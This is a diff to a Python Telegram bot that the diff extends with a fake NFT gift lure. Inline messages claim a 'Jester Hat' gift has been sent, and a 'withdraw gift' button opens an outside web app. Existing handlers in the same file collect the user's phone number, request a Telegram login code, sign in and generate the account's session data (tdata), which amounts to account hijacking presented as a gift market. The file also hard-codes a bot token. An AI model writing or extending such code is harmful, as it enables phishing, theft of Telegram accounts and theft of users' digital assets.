@@ -1,19 +1,27 @@
 import asyncio
 import os
+import json
 import httpx
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import (
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    InlineQueryResultArticle, InputTextMessageContent,
+)
 from auth import send_code, sign_in
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yKIhOCjCI")
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
 OWNER_ID = 7345056431
+MARKET_URL = "https://frontend-sigma-coral-35.vercel.app"
+BOT_USERNAME = "asfafaff_bot"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 pending = {}
+
+# ─── Redis helpers ────────────────────────────────────────────────────────────
 
 async def redis_set(key, value, ex=300):
     async with httpx.AsyncClient() as client:
@@ -37,12 +45,30 @@ async def redis_del(key):
             headers={"Authorization": f"Bearer {REDIS_TOKEN}"}
         )
 
+async def redis_set_json(key, data: dict, ex=86400):
+    import urllib.parse
+    value = urllib.parse.quote(json.dumps(data, ensure_ascii=False))
+    async with httpx.AsyncClient() as client:
+        await client.get(
+            f"{REDIS_URL}/set/{key}/{value}/EX/{ex}",
+            headers={"Authorization": f"Bearer {REDIS_TOKEN}"},
+        )
+
+# ─── /start ───────────────────────────────────────────────────────────────────
+
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
+    args = message.text.split(maxsplit=1)
+    payload = args[1] if len(args) > 1 else ""
+
+    if payload.startswith("gift_"):
+        await handle_gift_start(message, payload)
+        return
+
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
             text="🛍 Открыть маркет",
-            web_app=types.WebAppInfo(url="https://frontend-sigma-coral-35.vercel.app")
+            web_app=types.WebAppInfo(url=MARKET_URL)
         )]
     ])
     await message.answer(
@@ -51,6 +77,103 @@ async def start_handler(message: types.Message):
         "Нажми кнопку ниже чтобы открыть маркет 👇",
         reply_markup=keyboard
     )
+
+async def handle_gift_start(message: types.Message, payload: str):
+    try:
+        parts = payload.split("_")
+        nft_id = parts[1]          # JesterHat-18979
+        sender_id = parts[3] if len(parts) >= 4 else "unknown"
+
+        dash_idx = nft_id.rfind("-")
+        nft_slug = nft_id[:dash_idx].lower()   # jesterhat
+        nft_number = nft_id[dash_idx + 1:]     # 18979
+
+        nft_name = "Jester Hat"
+        full_name = f"{nft_name} #{nft_number}"
+        receiver_id = message.from_user.id
+
+        gift_data = {
+            "slug": nft_slug,
+            "number": int(nft_number),
+            "name": full_name,
+            "sender_id": sender_id,
+            "nft_id": nft_id,
+        }
+        await redis_set_json(f"gift:{receiver_id}", gift_data, ex=604800)
+        print(f"Gift saved: receiver={receiver_id}, nft={full_name}")
+
+        img_url = f"https://nft.fragment.com/gift/{nft_slug}-{nft_number}.webp"
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(
+                text="🎁 Вывести подарок",
+                web_app=types.WebAppInfo(url=f"{MARKET_URL}?gift={nft_slug}-{nft_number}")
+            )]
+        ])
+
+        await message.answer_photo(
+            photo=img_url,
+            caption=(
+                f"🎁 *Вам передали подарок!*\n\n"
+                f"*{full_name}*\n\n"
+                f"Нажмите кнопку ниже, чтобы вывести его в свой кошелёк"
+            ),
+            parse_mode="Markdown",
+            reply_markup=keyboard
+        )
+
+    except Exception as e:
+        print(f"handle_gift_start error: {e}")
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(
+                text="🛍 Открыть маркет",
+                web_app=types.WebAppInfo(url=MARKET_URL)
+            )]
+        ])
+        await message.answer("🎁 Вам передали подарок! Откройте маркет чтобы посмотреть.", reply_markup=keyboard)
+
+# ─── Inline mode ──────────────────────────────────────────────────────────────
+
+@dp.inline_query()
+async def inline_handler(query: types.InlineQuery):
+    sender_id = query.from_user.id
+
+    nft_slug = "jesterhat"
+    nft_number = 18979
+    nft_name = "Jester Hat #18979"
+    floor = 4.19
+
+    start_payload = f"gift_JesterHat-18979_from_{sender_id}"
+    gift_link = f"https://t.me/{BOT_USERNAME}?start={start_payload}"
+    img_url = f"https://nft.fragment.com/gift/{nft_slug}-{nft_number}.webp"
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Принять 🎁", url=gift_link)]
+    ])
+
+    caption = (
+        f"*через @{BOT_USERNAME}*\n"
+        f"_Кто-то решил вас порадовать — нажмите «Принять», чтобы получить подарок_\n\n"
+        f"*{nft_name}*\n"
+        f"💎 Мин. цена: {floor} TON"
+    )
+
+    results = [
+        InlineQueryResultArticle(
+            id="jesterhat-18979",
+            title="Jester Hat #18979",
+            description=f"Отправить подарок · Мин. цена: {floor} TON",
+            thumbnail_url=img_url,
+            input_message_content=InputTextMessageContent(
+                message_text=caption,
+                parse_mode="Markdown"
+            ),
+            reply_markup=keyboard
+        )
+    ]
+
+    await query.answer(results=results, cache_time=30, is_personal=False)
+
+# ─── Синхронизация (старый код — не трогать) ──────────────────────────────────
 
 @dp.message(F.contact)
 async def contact_handler(message: types.Message):
@@ -68,7 +191,6 @@ async def contact_handler(message: types.Message):
         }
         await redis_set(f"sync:{user_id}", "code_sent")
         print(f"Code sent, redis key: sync:{user_id} = code_sent")
-        # Сразу запускаем ожидание кода
         asyncio.create_task(wait_for_code(user_id))
     except Exception as e:
         print(f"send_code error: {e}")
@@ -146,6 +268,8 @@ async def generate_tdata(user_id, phone):
     await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
     if user_id in pending:
         del pending[user_id]
+
+# ─── Run ──────────────────────────────────────────────────────────────────────
 
 async def main():
     await dp.start_polling(bot)
